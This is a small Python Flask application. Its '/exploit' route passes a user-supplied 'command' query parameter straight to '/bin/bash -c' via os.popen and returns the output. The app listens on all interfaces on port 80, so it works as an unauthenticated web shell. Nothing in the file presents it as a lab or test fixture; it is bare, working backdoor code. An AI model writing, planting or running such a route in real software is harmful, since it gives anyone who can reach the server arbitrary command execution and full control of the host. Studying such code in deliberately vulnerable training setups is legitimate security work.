import os
from flask import Flask, request, render_template_string
app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello World!"

@app.route("/exploit")
def exploit():
    cmd = request.args.get('command')
    bash_cmd = "/bin/bash -c " + cmd
    return render_template_string('Shell output: {{out}}', out=str(os.popen(bash_cmd).read()))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 80))
    app.run(host='0.0.0.0', port=port)
